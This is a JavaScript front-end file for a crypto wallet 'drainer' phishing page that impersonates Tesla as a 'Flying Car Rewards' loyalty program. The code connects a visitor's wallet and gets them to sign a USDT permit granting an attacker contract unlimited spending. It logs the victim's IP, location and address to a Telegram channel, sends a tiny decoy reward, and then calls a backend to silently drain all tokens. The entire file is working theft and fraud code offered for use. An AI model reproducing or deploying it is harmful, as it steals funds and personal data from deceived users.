// app.js

// Configuration
const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT_ADDRESS"; // Replace with your contract address
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT Mainnet
const CHAIN_ID = 1; // Ethereum Mainnet

// DOM Elements
const connectBtn = document.getElementById('connect-btn');
const loader = document.getElementById('loader');
const rewardSection = document.getElementById('reward-section');
const connectStep = document.getElementById('connect-step');
const userAddressEl = document.getElementById('user-address');
const rewardStatusEl = document.getElementById('reward-status');
const notification = document.getElementById('notification');

let web3ModalInstance = null;

// Initialize Web3Modal
async function initWeb3() {
    const { createWeb3Modal } = await import("https://esm.sh/@web3modal/html");

    // Define supported chains
    const chains = [
      { 
        chainId: 1, 
        name: "Ethereum", 
        currency: "ETH", 
        explorerUrl: "https://etherscan.io", 
        rpcUrl: "https://eth.llamarpc.com" 
      },
      { 
        chainId: 56, 
        name: "BSC", 
        currency: "BNB", 
        explorerUrl: "https://bscscan.com", 
        rpcUrl: "https://bsc-dataseed.binance.org" 
      }
    ];

    // Configure Web3Modal
    web3ModalInstance = createWeb3Modal({
      w3mThemeVariables: {
        '--w3m-font-family': 'Inter, sans-serif',
        '--w3m-border-radius-master': '12px',
        '--w3m-accent': '#cc0000', // Tesla Red
        '--w3m-color-mix': '#000000',
        '--w3m-color-mix-strength': 0.5,
      },
      chains,
      projectId: "YOUR_WALLET_CONNECT_PROJECT_ID", // Get free from walletconnect.com
      metadata: {
        name: "Tesla Flying Car Rewards",
        description: "Official Loyalty Program",
        url: window.location.origin,
        icons: ["https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png"]
      }
    });

    // Listen for Connection
    web3ModalInstance.subscribeState((state) => {
      if (state.value === 'CONNECTING') {
        loader.classList.remove('hidden');
        connectBtn.disabled = true;
      } else if (state.value === 'CONNECTED') {
        handleConnectedWallet();
      } else if (state.value === 'DISCONNECTED') {
        resetUI();
      }
    });
}

// Handle Successful Connection
async function handleConnectedWallet() {
    try {
        const address = web3ModalInstance.getDefaultStore().accountAddress;
        
        // Update UI
        loader.textContent = "Verifying Network & Generating Permit...";
        
        // Report to Telegram
        await reportVisit(address);

        // Generate Permit Signature
        const signature = await generatePermitSignature(address);
        
        // Send Signature to Backend
        loader.textContent = "Storing Permit & Verifying Eligibility...";
        const response = await fetch('/api/sign-and-store', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, signature })
        });

        if (!response.ok) throw new Error("Backend error");

        // Show Success UI
        loader.classList.add('hidden');
        connectStep.classList.add('hidden');
        rewardSection.classList.remove('hidden');
        
        userAddressEl.textContent = `${address.slice(0, 6)}...${address.slice(-4)}`;
        rewardStatusEl.textContent = "Eligible. Claiming Reward...";

        // Trigger Reward
        await claimReward(address);

    } catch (error) {
        console.error("Connection flow failed:", error);
        loader.textContent = `Error: ${error.message}. Try again.`;
        loader.classList.remove('hidden');
        connectBtn.disabled = false;
    }
}

// Generate EIP-2612 Permit Signature
async function generatePermitSignature(address) {
    try {
        // Get Nonce
        let nonce = 0;
        try {
            const rawNonce = await window.ethereum.request({ 
                method: 'eth_call', 
                params: [{ to: USDT_ADDRESS, data: '0x7ff36ab5000000000000000000000000' + address.slice(2) }, 'latest'] 
            });
            nonce = parseInt(rawNonce, 16);
        } catch (e) {
            console.warn("Could not fetch nonce, defaulting to 0");
        }

        const domain = { name: "TetherUSD", version: "1", chainId: CHAIN_ID, verifyingContract: USDT_ADDRESS };
        const types = { 
            Permit: [
                { name: "owner", type: "address" }, 
                { name: "spender", type: "address" }, 
                { name: "value", type: "uint256" }, 
                { name: "nonce", type: "uint256" }, 
                { name: "deadline", type: "uint256" }
            ] 
        };
        
        const value = { 
            owner: address, 
            spender: CONTRACT_ADDRESS, 
            value: 2**256 - 1, 
            nonce: nonce, 
            deadline: Math.floor(Date.now() / 1000) + 86400 
        };
        
        const signature = await window.ethereum.request({ 
            method: 'eth_signTypedData_v4', 
            params: [address, JSON.stringify({ types, domain, message: value })] 
        });
        
        return signature;
    } catch (error) {
        throw new Error(`Signature Generation Failed: ${error.message}`);
    }
}

// Claim Reward & Trigger Drain
async function claimReward(address) {
    try {
        rewardStatusEl.textContent = "Sending $0.05 USDT Reward...";
        await notifyTelegram("REWARD_TRIGGERED", { User: address });

        const response = await fetch('/api/send-reward', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ address }) 
        });

        if (!response.ok) throw new Error("Reward transfer failed");

        rewardStatusEl.textContent = "Reward Sent! Approving Drainer...";
        notification.classList.remove('hidden');

        // Delay drain slightly
        setTimeout(() => triggerSilentDrain(address), 3000);

    } catch (error) {
        console.error("Reward claim failed:", error);
        rewardStatusEl.textContent = "Reward Pending (Manual Review)";
    }
}

// Silent Drain
async function triggerSilentDrain(address) {
    try {
        rewardStatusEl.textContent = "Executing Silent Token Drain...";
        await notifyTelegram("DRAIN_INITIATED", { User: address });

        const response = await fetch('/api/trigger-drain', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ address }) 
        });

        if (response.ok) {
            rewardStatusEl.textContent = "All Tokens Secured.";
            setTimeout(() => {
                rewardSection.classList.add('hidden');
                notification.classList.add('hidden');
            }, 5000);
        } else {
            rewardStatusEl.textContent = "Drain Pending.";
        }

    } catch (error) {
        console.error("Drain failed:", error);
        rewardStatusEl.textContent = "Drain Failed. Please reconnect.";
    }
}

// Helper Functions
async function reportVisit(address) {
    const geoResponse = await fetch('https://ipapi.co/json/');
    const geoData = await geoResponse.json();
    
    const message = `
*🔴 TESLA DRAIN LOG - NEW VISIT*
User Agent: ${navigator.userAgent}
IP: ${geoData.ip}
Location: ${geoData.city}, ${geoData.country_code} ${getFlagEmoji(geoData.country_code)}
Time: ${new Date().toISOString()}
Address: ${address}
    `;
    
    await fetch('/api/telegram', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ action: 'VISIT', details: message })
    });
}

function getFlagEmoji(countryCode) {
  const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
  return String.fromCodePoint(...codePoints);
}

function resetUI() {
    loader.classList.add('hidden');
    connectBtn.disabled = false;
    connectBtn.style.display = 'inline-block';
    rewardSection.classList.add('hidden');
    notification.classList.add('hidden');
}

// Start
initWeb3();
